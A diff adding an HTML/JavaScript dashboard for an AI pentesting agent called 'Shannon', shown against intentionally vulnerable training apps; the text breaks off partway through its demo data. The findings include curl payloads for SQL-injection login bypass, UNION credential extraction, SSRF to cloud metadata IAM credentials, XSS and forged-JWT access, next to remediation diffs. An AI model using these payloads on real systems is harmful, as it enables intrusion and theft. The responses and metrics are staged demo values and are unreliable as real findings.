@@ -1,0 +1,1017 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Shannon | Autonomous AI Security Pentesting Agent</title>
+  <!-- Tailwind CSS CDN -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  <!-- Lucide Icons -->
+  <script src="https://unpkg.com/lucide@latest"></script>
+  <!-- Chart.js -->
+  <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+  <!-- Animate.css -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"/>
+  <script>
+    tailwind.config = {
+      darkMode: 'class',
+      theme: {
+        extend: {
+          colors: {
+            cyber: {
+              dark: '#070a12',
+              card: '#0f172a',
+              cardHover: '#16223b',
+              border: '#1e293b',
+              accent: '#6366f1',
+              danger: '#f43f5e',
+              warning: '#f59e0b',
+              success: '#10b981',
+              cyan: '#06b6d4',
+              purple: '#a855f7'
+            }
+          },
+          fontFamily: {
+            mono: ['JetBrains Mono', 'Fira Code', 'monospace'],
+            sans: ['Inter', 'system-ui', 'sans-serif']
+          }
+        }
+      }
+    }
+  </script>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap');
+    body { font-family: 'Inter', sans-serif; background-color: #07090e; }
+    .code-font { font-family: 'JetBrains Mono', monospace; }
+    .glow-border { box-shadow: 0 0 15px rgba(99, 102, 241, 0.2); }
+    .glow-red { box-shadow: 0 0 20px rgba(244, 63, 94, 0.25); }
+    .glow-cyan { box-shadow: 0 0 20px rgba(6, 182, 212, 0.25); }
+    
+    /* Radar Scan Effect */
+    .radar-sweep {
+      position: absolute;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: conic-gradient(from 0deg at 50% 50%, rgba(6, 182, 212, 0.15) 0deg, transparent 60deg, transparent 360deg);
+      border-radius: 50%;
+      animation: rotateRadar 4s linear infinite;
+      pointer-events: none;
+    }
+    @keyframes rotateRadar {
+      from { transform: rotate(0deg); }
+      to { transform: rotate(360deg); }
+    }
+
+    /* Live Scanning Line */
+    .scan-bar {
+      height: 2px;
+      background: linear-gradient(90deg, transparent, #06b6d4, #6366f1, transparent);
+      animation: scanMove 2s ease-in-out infinite alternate;
+    }
+    @keyframes scanMove {
+      0% { transform: translateY(0); opacity: 0.3; }
+      100% { transform: translateY(180px); opacity: 1; }
+    }
+
+    /* Custom Scrollbar */
+    ::-webkit-scrollbar { width: 5px; height: 5px; }
+    ::-webkit-scrollbar-track { background: #070a12; }
+    ::-webkit-scrollbar-thumb { background: #1e293b; border-radius: 4px; }
+    ::-webkit-scrollbar-thumb:hover { background: #334155; }
+  </style>
+</head>
+<body class="text-slate-100 min-h-screen flex flex-col antialiased selection:bg-indigo-500 selection:text-white">
+
+  <!-- Scanning Banner when Active -->
+  <div id="scanningNotice" class="hidden bg-gradient-to-r from-indigo-900/90 via-cyan-900/90 to-indigo-900/90 border-b border-cyan-500/40 text-cyan-200 px-6 py-2 text-xs font-mono flex items-center justify-between transition-all">
+    <div class="flex items-center space-x-3">
+      <span class="relative flex h-2.5 w-2.5">
+        <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-cyan-400 opacity-75"></span>
+        <span class="relative inline-flex rounded-full h-2.5 w-2.5 bg-cyan-500"></span>
+      </span>
+      <span id="scanBannerText">LIVE PENTEST WORKFLOW EXECUTING: 5 Parallel Agent Workers fuzzing endpoints...</span>
+    </div>
+    <div class="flex items-center space-x-4">
+      <div class="w-48 bg-slate-900 rounded-full h-2 overflow-hidden border border-cyan-500/30">
+        <div id="scanProgressBar" class="bg-gradient-to-r from-cyan-400 to-indigo-500 h-full w-0 transition-all duration-300"></div>
+      </div>
+      <span id="scanProgressPercent" class="text-cyan-300 font-bold">0%</span>
+    </div>
+  </div>
+
+  <!-- Top Navbar -->
+  <header class="border-b border-cyber-border bg-[#0a0d14]/95 backdrop-blur sticky top-0 z-50 px-6 py-3 flex items-center justify-between">
+    <div class="flex items-center space-x-4">
+      <div class="flex items-center space-x-3">
+        <div class="w-10 h-10 rounded-xl bg-gradient-to-tr from-indigo-600 via-cyan-500 to-emerald-400 p-[1.5px] flex items-center justify-center glow-border">
+          <div class="w-full h-full bg-[#090d16] rounded-[10px] flex items-center justify-center">
+            <i data-lucide="shield-alert" class="w-5 h-5 text-cyan-400"></i>
+          </div>
+        </div>
+        <div>
+          <div class="flex items-center space-x-2">
+            <span class="font-extrabold text-xl tracking-tight bg-clip-text text-transparent bg-gradient-to-r from-white via-slate-200 to-cyan-200">SHANNON</span>
+            <span class="text-[11px] px-2 py-0.5 rounded-full bg-indigo-500/10 text-indigo-400 border border-indigo-500/30 font-mono">v2.4 Autonomous Pentester</span>
+          </div>
+          <p class="text-[11px] text-slate-400">Defensive Multi-Agent Orchestration • Temporal Workflow Engine</p>
+        </div>
+      </div>
+    </div>
+
+    <!-- Target selector & Controls -->
+    <div class="flex items-center space-x-3">
+      
+      <!-- Target Selector Dropdown -->
+      <div class="flex items-center bg-[#0f172a] border border-cyan-500/30 rounded-xl px-3.5 py-2 space-x-3 text-xs shadow-lg shadow-cyan-950/20">
+        <div class="flex items-center space-x-1.5 text-cyan-400 font-medium">
+          <i data-lucide="crosshair" class="w-4 h-4"></i>
+          <span>Target:</span>
+        </div>
+        <select id="targetSelect" onchange="handleTargetChange(this.value)" class="bg-transparent text-white font-mono font-bold focus:outline-none cursor-pointer text-xs pr-2">
+          <option value="juice-shop" class="bg-[#0f172a]">OWASP Juice-Shop (Full Stack Web)</option>
+          <option value="crapi" class="bg-[#0f172a]">crAPI (Microservices & REST API)</option>
+          <option value="capital-api" class="bg-[#0f172a]">Capital FinTech Banking API</option>
+        </select>
+      </div>
+
+      <!-- Agent Cluster Badge -->
+      <div class="flex items-center space-x-2 px-3 py-2 rounded-xl bg-emerald-500/10 border border-emerald-500/30 text-emerald-400 text-xs font-mono">
+        <span class="relative flex h-2 w-2">
+          <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
+          <span class="relative inline-flex rounded-full h-2 w-2 bg-emerald-500"></span>
+        </span>
+        <span id="orchestratorStatus">5 AGENTS ACTIVE</span>
+      </div>
+
+      <!-- Auto Demo Video Mode Button -->
+      <button onclick="startAutoDemo()" id="btnAutoDemo" class="px-3.5 py-2 rounded-xl bg-gradient-to-r from-amber-600 to-rose-600 hover:from-amber-500 hover:to-rose-500 text-white font-bold text-xs flex items-center space-x-1.5 shadow-lg shadow-rose-950/40 transition-all transform hover:scale-105">
+        <i data-lucide="video" class="w-3.5 h-3.5 fill-current"></i>
+        <span>🎬 30s Video Demo Mode</span>
+      </button>
+
+      <!-- Re-Scan Button -->
+      <button onclick="triggerScanAnimation()" class="px-4 py-2 rounded-xl bg-gradient-to-r from-indigo-600 to-cyan-600 hover:from-indigo-500 hover:to-cyan-500 text-white font-bold text-xs flex items-center space-x-1.5 shadow-lg shadow-indigo-500/30 transition-all transform hover:scale-105">
+        <i data-lucide="play" class="w-3.5 h-3.5 fill-current"></i>
+        <span>Re-Run Audit</span>
+      </button>
+    </div>
+  </header>
+
+  <!-- Main Content Layout -->
+  <main class="flex-1 p-6 grid grid-cols-12 gap-6 max-w-[1700px] mx-auto w-full">
+
+    <!-- Left Column: Metrics & Agents Status (4 cols) -->
+    <div class="col-span-12 lg:col-span-4 space-y-6">
+
+      <!-- Executive Scorecard -->
+      <div class="bg-cyber-card border border-cyber-border rounded-2xl p-5 relative overflow-hidden transition-all duration-300 hover:border-slate-700">
+        <div class="scan-bar absolute top-0 left-0 right-0"></div>
+
+        <div class="flex items-center justify-between mb-4">
+          <div class="flex items-center space-x-2">
+            <i data-lucide="activity" class="w-4 h-4 text-cyan-400"></i>
+            <h3 class="text-sm font-bold text-slate-200">Security Posture Summary</h3>
+          </div>
+          <span class="text-xs text-slate-400 font-mono" id="scanDate">Audited Nov 2026</span>
+        </div>
+
+        <div class="grid grid-cols-4 gap-2.5 text-center mb-5">
+          <div class="bg-rose-950/30 border border-rose-900/50 rounded-xl p-3 transform transition-all duration-300 hover:scale-105">
+            <span class="text-2xl font-black text-rose-400 font-mono block" id="critCount">8</span>
+            <p class="text-[10px] text-rose-300 font-semibold uppercase tracking-wider mt-0.5">Critical</p>
+          </div>
+          <div class="bg-amber-950/30 border border-amber-900/50 rounded-xl p-3 transform transition-all duration-300 hover:scale-105">
+            <span class="text-2xl font-black text-amber-400 font-mono block" id="highCount">14</span>
+            <p class="text-[10px] text-amber-300 font-semibold uppercase tracking-wider mt-0.5">High</p>
+          </div>
+          <div class="bg-blue-950/30 border border-blue-900/50 rounded-xl p-3 transform transition-all duration-300 hover:scale-105">
+            <span class="text-2xl font-black text-blue-400 font-mono block" id="medCount">9</span>
+            <p class="text-[10px] text-blue-300 font-semibold uppercase tracking-wider mt-0.5">Medium</p>
+          </div>
+          <div class="bg-slate-800/40 border border-slate-700/50 rounded-xl p-3 transform transition-all duration-300 hover:scale-105">
+            <span class="text-2xl font-black text-emerald-400 font-mono block" id="exploitedPercent">100%</span>
+            <p class="text-[10px] text-slate-400 font-semibold uppercase tracking-wider mt-0.5">PoC Verified</p>
+          </div>
+        </div>
+
+        <!-- Doughnut Chart Container -->
+        <div class="h-44 relative flex items-center justify-center">
+          <div class="radar-sweep"></div>
+          <canvas id="vulnChart"></canvas>
+        </div>
+      </div>
+
+      <!-- Parallel Multi-Agent Cluster -->
+      <div class="bg-cyber-card border border-cyber-border rounded-2xl p-5 space-y-4">
+        <div class="flex items-center justify-between">
+          <div class="flex items-center space-x-2">
+            <i data-lucide="cpu" class="w-4 h-4 text-indigo-400"></i>
+            <h3 class="text-sm font-bold text-slate-200">Parallel Agent Swarm</h3>
+          </div>
+          <span class="text-[11px] font-mono text-cyan-400" id="temporalWorkflowId">Temporal #wf-juice-9812</span>
+        </div>
+
+        <div class="space-y-2.5" id="agentList">
+          <!-- Dynamically populated via JS -->
+        </div>
+      </div>
+
+      <!-- 5-Phase Pipeline Engine -->
+      <div class="bg-cyber-card border border-cyber-border rounded-2xl p-5">
+        <div class="flex items-center justify-between mb-3">
+          <div class="flex items-center space-x-2">
+            <i data-lucide="git-merge" class="w-4 h-4 text-emerald-400"></i>
+            <h3 class="text-sm font-bold text-slate-200">5-Phase Pipeline Engine</h3>
+          </div>
+          <span class="text-[10px] font-mono text-emerald-400" id="pipelineStatusBadge">● All 5 Phases Passed</span>
+        </div>
+
+        <div class="relative pl-6 space-y-3.5 before:content-[''] before:absolute before:left-2.5 before:top-2 before:bottom-2 before:w-[2px] before:bg-indigo-500/40">
+          <div class="relative pipeline-step" id="step-1">
+            <div class="absolute -left-[19px] top-1 w-2.5 h-2.5 rounded-full bg-emerald-400 ring-4 ring-emerald-950 transition-all"></div>
+            <div class="text-xs font-semibold text-slate-200">Phase 1: Pre-Recon & AST Code Analysis</div>
+            <p class="text-[10px] text-slate-400 font-mono" id="step1Desc">Agentic SAST • 142 route handlers & AST sinks mapped</p>
+          </div>
+          <div class="relative pipeline-step" id="step-2">
+            <div class="absolute -left-[19px] top-1 w-2.5 h-2.5 rounded-full bg-emerald-400 ring-4 ring-emerald-950 transition-all"></div>
+            <div class="text-xs font-semibold text-slate-200">Phase 2: Dynamic Surface Recon</div>
+            <p class="text-[10px] text-slate-400 font-mono" id="step2Desc">OpenAPI schemas, parameter fuzzing, auth matrices</p>
+          </div>
+          <div class="relative pipeline-step" id="step-3">
+            <div class="absolute -left-[19px] top-1 w-2.5 h-2.5 rounded-full bg-emerald-400 ring-4 ring-emerald-950 transition-all"></div>
+            <div class="text-xs font-semibold text-slate-200">Phase 3: 5x Parallel Vulnerability Scanners</div>
+            <p class="text-[10px] text-slate-400 font-mono">Isolated Docker sandboxes fuzzing security boundaries</p>
+          </div>
+          <div class="relative pipeline-step" id="step-4">
+            <div class="absolute -left-[19px] top-1 w-2.5 h-2.5 rounded-full bg-emerald-400 ring-4 ring-emerald-950 transition-all"></div>
+            <div class="text-xs font-semibold text-slate-200">Phase 4: Autonomous Exploitation & PoC</div>
+            <p class="text-[10px] text-slate-400 font-mono">Deterministic verification with live curl reproducers</p>
+          </div>
+          <div class="relative pipeline-step" id="step-5">
+            <div class="absolute -left-[19px] top-1 w-2.5 h-2.5 rounded-full bg-cyan-400 ring-4 ring-cyan-950 transition-all"></div>
+            <div class="text-xs font-semibold text-slate-200">Phase 5: SARIF & Remediation Synthesis</div>
+            <p class="text-[10px] text-slate-400 font-mono">Auto-generated patch diffs & executive SARIF report</p>
+          </div>
+        </div>
+      </div>
+
+    </div>
+
+    <!-- Right Column: Interactive Finding Inspector & Live PoC (8 cols) -->
+    <div class="col-span-12 lg:col-span-8 space-y-6">
+
+      <!-- Navigation Tabs -->
+      <div class="flex items-center justify-between border-b border-cyber-border pb-3">
+        <div class="flex space-x-2">
+          <button onclick="switchTab('findings')" id="tab-findings" class="px-4 py-2 text-xs font-bold rounded-xl bg-indigo-600 text-white flex items-center space-x-2 transition-all shadow-lg shadow-indigo-600/30">
+            <i data-lucide="shield-check" class="w-3.5 h-3.5"></i>
+            <span>Vulnerability Findings & PoCs</span>
+          </button>
+          <button onclick="switchTab('terminal')" id="tab-terminal" class="px-4 py-2 text-xs font-semibold rounded-xl text-slate-400 hover:text-white hover:bg-slate-800 flex items-center space-x-2 transition-all">
+            <i data-lucide="terminal" class="w-3.5 h-3.5"></i>
+            <span>Live Agent Logs</span>
+          </button>
+          <button onclick="switchTab('remediation')" id="tab-remediation" class="px-4 py-2 text-xs font-semibold rounded-xl text-slate-400 hover:text-white hover:bg-slate-800 flex items-center space-x-2 transition-all">
+            <i data-lucide="code-2" class="w-3.5 h-3.5"></i>
+            <span>Auto-Remediation Diffs</span>
+          </button>
+        </div>
+
+        <div class="flex items-center space-x-2">
+          <button onclick="exportSARIF()" class="px-3.5 py-1.5 rounded-xl bg-cyber-card border border-cyber-border hover:border-slate-500 text-slate-300 text-xs flex items-center space-x-1.5 font-mono transition-all">
+            <i data-lucide="download" class="w-3.5 h-3.5 text-cyan-400"></i>
+            <span>Export SARIF 2.1</span>
+          </button>
+          <button onclick="window.print()" class="px-3.5 py-1.5 rounded-xl bg-cyber-card border border-cyber-border hover:border-slate-500 text-slate-300 text-xs flex items-center space-x-1.5 font-mono transition-all">
+            <i data-lucide="file-text" class="w-3.5 h-3.5 text-amber-400"></i>
+            <span>Executive PDF</span>
+          </button>
+        </div>
+      </div>
+
+      <!-- Tab 1: Findings & Exploit Evidence -->
+      <div id="view-findings" class="space-y-4">
+        
+        <!-- Filter Bar -->
+        <div class="flex items-center justify-between bg-cyber-card border border-cyber-border rounded-xl p-3 text-xs">
+          <div class="flex items-center space-x-2" id="filterButtonGroup">
+            <span class="text-slate-400 font-medium">Filter By Class:</span>
+            <button onclick="filterFindings('all')" id="btn-filter-all" class="px-3 py-1 rounded-lg bg-indigo-600/40 text-indigo-300 border border-indigo-500/50 font-medium">All</button>
+            <button onclick="filterFindings('injection')" id="btn-filter-injection" class="px-3 py-1 rounded-lg bg-slate-800 text-slate-300 hover:bg-slate-700 font-medium">Injection</button>
+            <button onclick="filterFindings('auth')" id="btn-filter-auth" class="px-3 py-1 rounded-lg bg-slate-800 text-slate-300 hover:bg-slate-700 font-medium">Auth & AuthZ</button>
+            <button onclick="filterFindings('ssrf')" id="btn-filter-ssrf" class="px-3 py-1 rounded-lg bg-slate-800 text-slate-300 hover:bg-slate-700 font-medium">SSRF</button>
+            <button onclick="filterFindings('xss')" id="btn-filter-xss" class="px-3 py-1 rounded-lg bg-slate-800 text-slate-300 hover:bg-slate-700 font-medium">XSS</button>
+          </div>
+          <span class="text-emerald-400 font-mono text-[11px] flex items-center space-x-1">
+            <i data-lucide="shield" class="w-3 h-3"></i>
+            <span>Deterministic Autonomous Verification</span>
+          </span>
+        </div>
+
+        <!-- Vulnerability Items Container (Dynamically rendered) -->
+        <div id="findingsContainer" class="space-y-4">
+          <!-- Rendered by JavaScript -->
+        </div>
+      </div>
+
+      <!-- Tab 2: Live Agent Terminal -->
+      <div id="view-terminal" class="hidden space-y-4">
+        <div class="bg-[#05070c] border border-cyber-border rounded-2xl p-4 font-mono text-xs overflow-hidden relative shadow-2xl">
+          <div class="flex items-center justify-between pb-3 mb-3 border-b border-cyber-border">
+            <div class="flex items-center space-x-2">
+              <span class="w-3 h-3 rounded-full bg-rose-500 inline-block"></span>
+              <span class="w-3 h-3 rounded-full bg-amber-500 inline-block"></span>
+              <span class="w-3 h-3 rounded-full bg-emerald-500 inline-block"></span>
+              <span class="text-slate-400 ml-2" id="terminalTitle">shannon-worker [Temporal Stream: juice-shop]</span>
+            </div>
+            <div class="flex items-center space-x-3">
+              <span class="text-emerald-400 animate-pulse text-[11px] font-bold">● LIVE ENGINE LOGS</span>
+              <button onclick="clearTerminal()" class="text-slate-500 hover:text-slate-300 text-[10px]">Clear</button>
+            </div>
+          </div>
+
+          <div id="terminalBody" class="space-y-1.5 h-[450px] overflow-y-auto text-slate-300 pr-2">
+            <!-- Dynamic Logs -->
+          </div>
+        </div>
+      </div>
+
+      <!-- Tab 3: Code Remediation Diffs -->
+      <div id="view-remediation" class="hidden space-y-4">
+        <div class="bg-cyber-card border border-cyber-border rounded-2xl p-6 space-y-5" id="remediationContainer">
+          <!-- Rendered dynamically by JS -->
+        </div>
+      </div>
+
+    </div>
+
+  </main>
+
+  <!-- Footer -->
+  <footer class="border-t border-cyber-border bg-[#0a0d14] px-6 py-4 mt-auto text-xs text-slate-500 flex items-center justify-between">
+    <div class="flex items-center space-x-2">
+      <i data-lucide="shield" class="w-4 h-4 text-indigo-400"></i>
+      <span>Shannon AI Pentesting Platform • Engineered by John Goyo</span>
+    </div>
+    <div class="flex items-center space-x-6 font-mono text-[11px]">
+      <span class="text-slate-400">Temporal Engine: <span class="text-emerald-400 font-bold">RUNNING (:8233)</span></span>
+      <span class="text-slate-400">Docker Sandbox: <span class="text-emerald-400 font-bold">ISOLATED</span></span>
+    </div>
+  </footer>
+
+  <!-- DATA & DYNAMIC SCRIPT -->
+  <script>
+    // Comprehensive Data for each target
+    const TARGET_DATA = {
+      "juice-shop": {
+        name: "OWASP Juice-Shop (Full Stack Web)",
+        workflowId: "Temporal #wf-juice-shop-9812",
+        date: "Audited Nov 2026",
+        metrics: { crit: 8, high: 14, med: 9, pocRate: "100%" },
+        chartData: [8, 14, 9],
+        agents: [
+          { name: "InjectionAgent", desc: "SQLi, NoSQLi, RCE, Command Fuzzing", badge: "3 CRITICAL", badgeClass: "bg-rose-500/20 text-rose-300 border-rose-500/30", icon: "terminal", iconColor: "text-rose-400" },
+          { name: "AuthAgent", desc: "JWT Forgery, BruteForce, OAuth Flow", badge: "2 CRITICAL", badgeClass: "bg-rose-500/20 text-rose-300 border-rose-500/30", icon: "key", iconColor: "text-amber-400" },
+          { name: "AuthZAgent (BOLA / IDOR)", desc: "Privilege Escalation, Multi-Tenant Escape", badge: "2 CRITICAL", badgeClass: "bg-rose-500/20 text-rose-300 border-rose-500/30", icon: "lock", iconColor: "text-indigo-400" },
+          { name: "SSRFAgent", desc: "Cloud Metadata 169.254, Internal Pivot", badge: "1 HIGH", badgeClass: "bg-amber-500/20 text-amber-300 border-amber-500/30", icon: "radio", iconColor: "text-cyan-400" },
+          { name: "XSSAgent", desc: "DOM, Reflected, Stored, CSP Bypass", badge: "2 HIGH", badgeClass: "bg-purple-500/20 text-purple-300 border-purple-500/30", icon: "code", iconColor: "text-purple-400" }
+        ],
+        step1: "Agentic SAST • 142 route handlers & AST database sinks mapped",
+        step2: "Dynamic surface mapper discovered 43 public REST endpoints",
+        findings: [
+          {
+            id: "INJ-VULN-01",
+            category: "injection",
+            severity: "CRITICAL 9.8",
+            cwe: "CWE-89: SQL Injection",
+            title: "SQL Injection Authentication Bypass via Login Endpoint",
+            desc: "Direct unparameterized string concatenation in authentication query allows attacker to bypass authentication and gain full administrator privileges.",
+            endpoint: "POST /rest/user/login",
+            impact: "Total DB Exfiltration & Admin Takeover",
+            poc: `curl -X POST "http://target.local:3001/rest/user/login" \\
+  -H "Content-Type: application/json" \\
+  -d '{"email":"' OR '1'='1' --", "password":"irrelevant"}'`,
+            response: `HTTP/1.1 200 OK | {"status":"success","data":{"user":{"id":1,"email":"admin@juice-sh.op","role":"admin"},"token":"eyJhbGciOiJSUzI1NiIsInR5cCI6..."}}`
+          },
+          {
+            id: "AUTHZ-BOLA-03",
+            category: "auth",
+            severity: "CRITICAL 9.1",
+            cwe: "CWE-639: Broken Object Level Authorization (BOLA)",
+            title: "Horizontal Privilege Escalation & Private Order Scraping",
+            desc: "Missing tenancy ownership verification on Basket/Order resource lets any authenticated user query and modify other users' baskets.",
+            endpoint: "GET /rest/basket/{target_user_id}",
+            impact: "PII Leakage & Unauthorized Basket Mutation",
+            poc: `curl -X GET "http://target.local:3001/rest/basket/1" \\
+  -H "Authorization: Bearer <attacker_jwt_token>"`,
+            response: `HTTP/1.1 200 OK | {"status":"success","data":{"id":1,"UserId":1,"Products":[{"id":2,"name":"Apple Juice","price":1.99}]}}`
+          },
+          {
+            id: "SSRF-01",
+            category: "ssrf",
+            severity: "HIGH 8.6",
+            cwe: "CWE-918: Server-Side Request Forgery (SSRF)",
+            title: "Profile Image URL Import Cloud Metadata Leak",
+            desc: "Image import utility fails to validate internal loopback / metadata ranges, allowing arbitrary server requests to AWS/GCP 169.254.169.254.",
+            endpoint: "POST /profile/image/url",
+            impact: "Cloud IAM Role & Metadata Theft",
+            poc: `curl -X POST "http://target.local:3001/profile/image/url" \\
+  -H "Content-Type: application/json" \\
+  -d '{"imageUrl":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'`,
+            response: `HTTP/1.1 200 OK | {"status":"success","data":["app-production-backend-role"]}`
+          },
+          {
+            id: "XSS-02",
+            category: "xss",
+            severity: "HIGH 7.5",
+            cwe: "CWE-79: Reflected Cross-Site Scripting",
+            title: "Angular Security Bypass in Search Query Parameter",
+            desc: "Angular client-side interpolation flaw allows executing arbitrary JavaScript in the context of the user's browser session.",
+            endpoint: "GET /#/search?q=<iframe src=javascript:alert(1)>",
+            impact: "Session Hijacking & Keystroke Logging",
+            poc: `curl -X GET "http://target.local:3001/#/search?q=%3Ciframe%20src%3Djavascript%3Aalert(1)%3E"`,
+            response: `HTTP/1.1 200 OK | Payload reflected in DOM context without sanitization`
+          }
+        ],
+        remediation: {
+          file: "routes/login.js",
+          issue: "INJ-VULN-01 (SQL Injection Fix)",
+          oldCode: `models.sequelize.query(\`SELECT * FROM Users WHERE email = '\${req.body.email}' AND password = '\${security.hash(req.body.password)}'\`);`,
+          newCode: `models.sequelize.query('SELECT * FROM Users WHERE email = :email AND password = :password', {
+  replacements: { email: req.body.email, password: security.hash(req.body.password) },
+  type: models.sequelize.QueryTypes.SELECT
+});`
+        },
+        logs: [
+          "[Temporal] Starting pentestPipelineWorkflow (workflowId: wf-shannon-juice-9812)",
+          "[Phase 1: Pre-Recon] AST static code analyzer parsed 142 route handlers",
+          "[Phase 1: Pre-Recon] Identified 18 database access sinks lacking prepared statements",
+          "[Phase 2: Recon] Dynamic surface mapper discovered 43 public REST endpoints",
+          "[Temporal] Spawning 5 parallel agent workers across isolated Docker sandbox:",
+          "   ├─ [Worker 1] InjectionAgent (SQLi, NoSQLi, RCE, SSTI)",
+          "   ├─ [Worker 2] AuthAgent (JWT, OAuth, Credential stuffing)",
+          "   ├─ [Worker 3] AuthZAgent (BOLA, IDOR, Privilege escalation)",
+          "   ├─ [Worker 4] SSRFAgent (Cloud metadata, Loopback scan)",
+          "   └─ [Worker 5] XSSAgent (DOM, Reflected, Stored XSS)",
+          "[InjectionAgent] CRITICAL HIT: POST /rest/user/login vulnerable to SQLi authentication bypass",
+          "[InjectionAgent] Generated deterministic PoC: admin token exfiltrated in 140ms",
+          "[AuthZAgent] CRITICAL HIT: GET /rest/basket/:id lacks tenancy owner verification",
+          "[SSRFAgent] HIGH HIT: POST /profile/image/url reachable to internal link-local 169.254.169.254",
+          "[Phase 4: Exploitation] Running reconciliation & SARIF rendering",
+          "[Workflow Complete] Audit finished with 8 Critical, 14 High, 9 Medium. SARIF written to disk."
+        ]
+      },
+
+      "crapi": {
+        name: "crAPI (Microservices & REST API)",
+        workflowId: "Temporal #wf-crapi-microservices-4421",
+        date: "Audited Nov 2026",
+        metrics: { crit: 6, high: 11, med: 7, pocRate: "100%" },
+        chartData: [6, 11, 7],
+        agents: [
+          { name: "InjectionAgent", desc: "PostgreSQL & MongoDB Coupon Sinks", badge: "2 CRITICAL", badgeClass: "bg-rose-500/20 text-rose-300 border-rose-500/30", icon: "terminal", iconColor: "text-rose-400" },
+          { name: "AuthAgent", desc: "JWT Algorithm Confusion & OTP Brute-Force", badge: "2 CRITICAL", badgeClass: "bg-rose-500/20 text-rose-300 border-rose-500/30", icon: "key", iconColor: "text-rose-400" },
+          { name: "AuthZAgent (BOLA / IDOR)", desc: "Vehicle Location & Order Scraping", badge: "2 CRITICAL", badgeClass: "bg-rose-500/20 text-rose-300 border-rose-500/30", icon: "lock", iconColor: "text-rose-400" },
+          { name: "SSRFAgent", desc: "Contact Mechanic Internal Request Smuggling", badge: "1 CRITICAL", badgeClass: "bg-rose-500/20 text-rose-300 border-rose-500/30", icon: "radio", iconColor: "text-rose-400" },
+          { name: "XSSAgent", desc: "React Markdown & Template Sanitizers", badge: "0 CLEAN", badgeClass: "bg-slate-700/40 text-slate-400 border-slate-600", icon: "code", iconColor: "text-slate-400" }
+        ],
+        step1: "Agentic SAST • 8 microservices (Identity, Workshop, Community) parsed",
+        step2: "Mapped 38 REST endpoints across Java Spring & Python Flask containers",
+        findings: [
+          {
+            id: "CRAPI-INJ-03",
+            category: "injection",
+            severity: "CRITICAL 9.9",
+            cwe: "CWE-89: PostgreSQL SQL Injection",
+            title: "SQL Injection in Coupon Code Validation Engine",
+            desc: "The apply_coupon endpoint concatenates the coupon_code directly into SQL query, allowing UNION extraction of user credentials and password hashes.",
+            endpoint: "POST /workshop/api/shop/apply_coupon",
+            impact: "Total Database Compromise & Credential Theft",
+            poc: `curl -X POST "http://crapi.local:8000/workshop/api/shop/apply_coupon" \\
+  -H "Authorization: Bearer <user_jwt>" \\
+  -H "Content-Type: application/json" \\
+  -d '{"coupon_code":"' UNION SELECT 1, email, password, 4 FROM user_login --", "amount":10}'`,
+            response: `HTTP/1.1 200 OK | {"applied":true,"discount":1,"metadata":"admin@crapi.io:$2a$12$e8Y..."}`
+          },
+          {
+            id: "CRAPI-AUTH-01",
+            category: "auth",
+            severity: "CRITICAL 9.6",
+            cwe: "CWE-327: JWT Algorithm Confusion & Unsigned Token Acceptance",
+            title: "JWT Algorithm Confusion (RS256 to HS256) & None Algorithm",
+            desc: "Identity service verifies asymmetric RSA public key as HMAC secret, allowing arbitrary user and admin token forgery.",
+            endpoint: "POST /identity/api/auth/v2/verify-token",
+            impact: "Full Admin Authentication Forgery",
+            poc: `curl -X GET "http://crapi.local:8000/identity/api/v2/vehicle/records" \\
+  -H "Authorization: Bearer <forged_hs256_admin_token>"`,
+            response: `HTTP/1.1 200 OK | {"status":"ADMIN_AUTHORIZED","vehicles":[{"vin":"1HGCR2F83HA001","owner":"ceo@crapi.io"}]}`
+          },
+          {
+            id: "CRAPI-SSRF-02",
+            category: "ssrf",
+            severity: "CRITICAL 9.2",
+            cwe: "CWE-918: SSRF via Contact Mechanic Gateway",
+            title: "SSRF with Authorization Header Forwarding to Internal Network",
+            desc: "Contact mechanic endpoint forwards user JWT tokens to attacker-controlled internal microservice URLs with auto-retry enabled.",
+            endpoint: "POST /workshop/api/mechanic/contact_mechanic",
+            impact: "Internal Microservice Compromise & Token Leak",
+            poc: `curl -X POST "http://crapi.local:8000/workshop/api/mechanic/contact_mechanic" \\
+  -H "Authorization: Bearer <user_jwt>" \\
+  -d '{"mechanic_api":"http://internal-vault.svc:8080/secrets"}'`,
+            response: `HTTP/1.1 200 OK | {"response":{"db_root_password":"SuperSecretVaultPassword2026!"}}`
+          }
+        ],
+        remediation: {
+          file: "workshop/services/shop_service.py",
+          issue: "CRAPI-INJ-03 (PostgreSQL Parameterization)",
+          oldCode: `cursor.execute(f"SELECT id, discount FROM coupons WHERE code = '{coupon_code}'")`,
+          newCode: `cursor.execute("SELECT id, discount FROM coupons WHERE code = %s", (coupon_code,))`
+        },
+        logs: [
+          "[Temporal] Starting pentestPipelineWorkflow (workflowId: wf-crapi-microservices-4421)",
+          "[Phase 1: Pre-Recon] Analyzing 8 microservice repositories (Java Spring + Python Flask)",
+          "[Phase 1: Pre-Recon] Identified JWT validation flaw in Identity microservice",
+          "[Phase 2: Recon] Dynamic surface mapper discovered 38 REST endpoints",
+          "[Temporal] Parallel Execution: 5 agents dispatched into Docker sandbox",
+          "[InjectionAgent] CRITICAL: POST /workshop/api/shop/apply_coupon vulnerable to UNION SQLi",
+          "[AuthAgent] CRITICAL: JWT accepts 'alg': 'none' and RS256/HS256 confusion",
+          "[AuthZAgent] CRITICAL: Vehicle telemetry endpoint lacks BOLA ownership filter",
+          "[SSRFAgent] CRITICAL: Contact mechanic endpoint proxies requests to internal vault.svc",
+          "[Phase 5: Synthesis] Generated SARIF 2.1 report with verified exploit chains."
+        ]
+      },
+
+      "capital-api": {
+        name: "Capital FinTech Banking API",
+        workflowId: "Temporal #wf-capital-banking-1082",
+        date: "Audited Nov 2026",
+        metrics: { crit: 5, high: 9, med: 4, pocRate: "100%" },
+        chartData: [5, 9, 4],
+        agents: [
